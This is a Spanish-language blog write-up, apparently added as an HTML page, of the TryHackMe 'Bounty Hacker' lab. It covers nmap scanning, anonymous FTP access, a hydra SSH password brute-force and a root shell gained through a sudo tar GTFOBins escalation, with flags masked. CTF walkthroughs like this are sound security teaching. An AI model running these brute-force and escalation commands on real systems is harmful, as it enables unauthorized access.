@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe Bounty Hacker Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Bounty Hacker Writeup | Jgarcix Ciberseguridad y Hacking Ético</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="TryHackMe Bounty Hacker Writeup" />
+<meta name="author" content="Jgarcix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="La máquina Bounty Hacker, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt" />
+<meta property="og:description" content="La máquina Bounty Hacker, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt" />
+<link rel="canonical" href="https://jgarcix.github.io/TryHackMe-Bounty-Hacker-Writeup" />
+<meta property="og:url" content="https://jgarcix.github.io/TryHackMe-Bounty-Hacker-Writeup" />
+<meta property="og:site_name" content="Jgarcix Ciberseguridad y Hacking Ético" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-23T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Bounty Hacker Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jgarcix","url":""},"dateModified":"2023-03-23T00:00:00+00:00","datePublished":"2023-03-23T00:00:00+00:00","description":"La máquina Bounty Hacker, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt","headline":"TryHackMe Bounty Hacker Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://jgarcix.github.io/TryHackMe-Bounty-Hacker-Writeup"},"url":"https://jgarcix.github.io/TryHackMe-Bounty-Hacker-Writeup"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link  rel="icon"   href="assets/favicon.png" type="image/png" />
+</head>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>jgarcix@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archivos"><h2 class="header-link">Archivos</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<!--
+  <a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+-->
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe Bounty Hacker Writeup</h2>
+  <time datetime="2023-03-23T00:00:00+00:00" class="by-line">23 Mar 2023</time>
+  <p>La máquina Bounty Hacker, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-T5</span> <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.40.43
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-23 14:34 EDT
+Initiating Connect Scan at 14:34
+Scanning 10.10.40.43 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.40.43
+Discovered open port 21/tcp on 10.10.40.43
+Discovered open port 22/tcp on 10.10.40.43
+Completed Connect Scan at 14:34, 24.83s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.40.43
+Host is up, received user-set <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-03-23 14:34:13 EDT <span class="k">for </span>25s
+Not shown: 56360 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 9172 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>24.87 seconds
+</code></pre></div></div>
+
+<p>El escaneo nos reporta tres puertos abiertos, el 21, el 22 y el 80, así como el servicio que corre en cada uno de ellos.</p>
+
+<p>Ananalizamos la versión y servicio de estos puertos mediante nmap para sacar más información:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p21</span>,22,80 <span class="nt">-sCV</span> 10.10.40.43 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-23 14:34 EDT
+Stats: 0:00:28 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Script Scan
+NSE Timing: About 98.81% <span class="k">done</span><span class="p">;</span> ETC: 14:35 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.40.43
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 230
+|_Login successful.
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.22 seconds
+</span></code></pre></div></div>
+
+<h1 id="acceso-al-sistema"><a href="$header-1"></a>Acceso al sistema</h1>
+
+<p>El puerto 22 nos reporta que podemos logearnos. Lo intentamos con el usuario anonymous y lo conseguimos.</p>
+
+<p>Podemos ver los archivos y llevarnoslos a nuestro equipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|35549|<span class="o">)</span>
+ftp: Can<span class="s1">'t connect to `10.10.40.43:35549'</span>: Expiró el tiempo de conexión
+200 EPRT <span class="nb">command </span>successful. Consider using EPSV.
+150 Here comes the directory listing.
+<span class="nt">-rw-rw-r--</span>    1 ftp      ftp           418 Jun 07  2020 locks.txt
+<span class="nt">-rw-rw-r--</span>    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+ftp&gt; get locks.txt
+<span class="nb">local</span>: locks.txt remote: locks.txt
+200 EPRT <span class="nb">command </span>successful. Consider using EPSV.
+150 Opening BINARY mode data connection <span class="k">for </span>locks.txt <span class="o">(</span>418 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">**********************************************</span>|   418        8.52 KiB/s    00:00 ETA
+226 Transfer complete.
+418 bytes received <span class="k">in </span>00:00 <span class="o">(</span>3.10 KiB/s<span class="o">)</span>
+ftp&gt; get task.txt
+<span class="nb">local</span>: task.txt remote: task.txt
+200 EPRT <span class="nb">command </span>successful. Consider using EPSV.
+150 Opening BINARY mode data connection <span class="k">for </span>task.txt <span class="o">(</span>68 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">**********************************************</span>|    68        5.41 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received <span class="k">in </span>00:00 <span class="o">(</span>0.72 KiB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>El archivo task.txt nos reporta un usuario (pregunta de la room en THM). Por otro lado, el archivo locks.txt nos muestra potenciales contraseñas para ese usuario. Teniendo esto, intentaremos conectarnos por SSH (pregunta de la room de THM) con el usuario y alguna de las contraseñas proporcionadas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hydra <span class="nt">-l</span> lin <span class="nt">-P</span> /home/jorge/THM/BountyHacker/nmap/locks.txt ssh://10.10.40.43
+Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-03-23 14:52:29
+<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries <span class="o">(</span>l:1/p:26<span class="o">)</span>, ~2 tries per task
+<span class="o">[</span>DATA] attacking ssh://10.10.40.43:22/
+<span class="o">[</span>22][ssh] host: 10.10.40.43   login: lin   password: ??????????????
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-03-23 14:52:35
+
+</code></pre></div></div>
+
+<p>Nos reporta una la contraseña (pregunta de la room en THM).</p>
+
+<p>Nos conectamos mediante ssh:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh lin@10.10.40.43
+The authenticity of host <span class="s1">'10.10.40.43 (10.10.40.43)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.40.43<span class="s1">' (ED25519) to the list of known hosts.
+lin@10.10.40.43'</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.15.0-101-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Listamos el conteido y obtenemos user.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lin@bountyhacker:~/Desktop<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+lin@bountyhacker:~/Desktop<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+???????????????????
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios"><a href="$header-1"></a>Escalada de privilegios</h1>
+
+<p>Hacemos sudo -l y nos reporta que podemos ejecutar el binario /bin/tar como sudo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lin@bountyhacker:~/Desktop<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>lin: 
+Matching Defaults entries <span class="k">for </span>lin on bountyhacker:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    <span class="o">(</span>root<span class="o">)</span> /bin/tar
+</code></pre></div></div>
+
+<p>Nos dirigimos a <a href="https://gtfobins.github.io/gtfobins/tar/"> GTFO bins </a>y ejecutamos el comando proporcionado:</p>
+
+<blockquote>
+  <p>sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh</p>
+</blockquote>
+
+<p>Obtenemos acceso al sistema como root. Nos dirigimos a /root y conseguimos root.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lin@bountyhacker:~/Desktop<span class="nv">$ </span>    <span class="nb">sudo tar</span> <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/sh
+<span class="nb">tar</span>: Removing leading <span class="sb">`</span>/<span class="s1">' from member names
+#ls
+root.txt
+#cat root.txt
+???????????????
+</span></code></pre></div></div>
+
+<p>Muchas gracias por leer este Writeup, espero que te haya gustado mucho!</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://www.instagram.com/jgarcix/">
+    <span>
+        <b>Jgarcix</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
